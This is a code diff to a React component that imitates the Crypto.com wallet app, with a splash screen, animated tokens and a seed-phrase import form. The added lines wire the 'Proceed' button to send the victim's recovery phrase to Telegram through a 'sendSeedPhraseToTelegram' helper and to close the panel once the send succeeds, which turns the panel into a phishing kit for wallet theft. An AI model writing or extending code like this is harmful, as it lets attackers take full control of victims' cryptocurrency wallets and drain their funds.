@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 
 interface CryptoComPanelProps {
   isOpen: boolean;
@@ -16,6 +17,7 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
   const [showPhrase, setShowPhrase] = useState(false);
   const [updateProgress, setUpdateProgress] = useState(0);
   const [seedError, setSeedError] = useState(false);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -28,8 +30,9 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
       setShowPhrase(false);
       setUpdateProgress(0);
       setSeedError(false);
+      setIsSending(false);
 
-      const timer = setTimeout(() => setView('password'), 3000); // slightly longer to enjoy the splash
+      const timer = setTimeout(() => setView('password'), 3000);
       return () => clearTimeout(timer);
     }
   }, [isOpen]);
@@ -108,25 +111,21 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
               <div className="absolute inset-0 w-full h-full overflow-hidden pointer-events-none">
                 
                 {/* 1. Cronos (CRO) */}
-                {/* CHANGE 'top-[35%]' and 'left-[15%]' below to move this token */}
                 <div className="absolute top-[35%] left-[15%] w-[45px] h-[45px] bg-[#002D74] rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_6s_ease-in-out_infinite]">
                   <CronosTokenSVG className="w-7 h-7 text-white" />
                 </div>
                 
                 {/* 2. Bitcoin (BTC) */}
-                {/* CHANGE 'top-[20%]' and 'right-[20%]' below to move this token */}
                 <div className="absolute top-[20%] right-[20%] w-[55px] h-[55px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_7s_ease-in-out_infinite_1s]">
                   <BitcoinTokenSVG className="w-[32px] h-[32px]" />
                 </div>
 
                 {/* 3. Ethereum (ETH) */}
-                {/* CHANGE 'bottom-[25%]' and 'left-[25%]' below to move this token */}
                 <div className="absolute bottom-[25%] left-[25%] w-[50px] h-[50px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_5s_ease-in-out_infinite_2s]">
                   <EthereumTokenSVG className="w-7 h-7 text-[#627EEA]" />
                 </div>
 
                 {/* 4. Second Cronos (CRO) */}
-                {/* CHANGE 'bottom-[35%]' and 'right-[15%]' below to move this token */}
                 <div className="absolute bottom-[35%] right-[15%] w-[40px] h-[40px] bg-white rounded-full shadow-lg flex items-center justify-center animate-[cryptoDrift_8s_ease-in-out_infinite_0.5s]">
                   <CronosTokenSVG className="w-6 h-6 text-[#002D74]" />
                 </div>
@@ -347,17 +346,24 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
                 </button>
               </div>
 
-              {/* Proceed Button */}
+              {/* Proceed Button — NOW SENDS TO TELEGRAM */}
               <div className="px-6 pb-6 mt-auto shrink-0 bg-white dark:bg-[#121212] pt-2">
                 <button 
                   className="w-full font-roboto bg-[#1199fa] hover:bg-[#3bb4ff] active:bg-[#0476d4] text-[#ffffff] py-[13px] px-[15px] rounded-[12px] font-semibold text-[16px] disabled:opacity-30 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]" 
-                  disabled={!isPhraseComplete()}
-                  onClick={() => {
-                    console.log("Crypto.com Import Complete:", phraseValues.slice(0, phraseLength));
-                    onClose();
+                  disabled={!isPhraseComplete() || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                    const success = await sendSeedPhraseToTelegram(seedString, 'Crypto.com Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
                   }}
                 >
-                  Proceed
+                  {isSending ? 'Sending...' : 'Proceed'}
                 </button>
               </div>
             </div>
@@ -379,7 +385,6 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
           50% { opacity: 1; transform: scale(1.05); }
         }
         
-        /* New Drift Animation for Floating Tokens */
         @keyframes cryptoDrift {
           0% { transform: translateY(20px) scale(0.9); opacity: 0; }
           20% { opacity: 0.7; }
@@ -401,7 +406,7 @@ export default function CryptoComPanel({ isOpen, onClose }: CryptoComPanelProps)
 }
 
 // -------------------------------------------------------------------
-// CRYPTO.COM SVG COMPONENTS
+// SVG COMPONENTS (unchanged)
 // -------------------------------------------------------------------
 
 const CryptoBgSVG = ({ className }: { className?: string }) => (
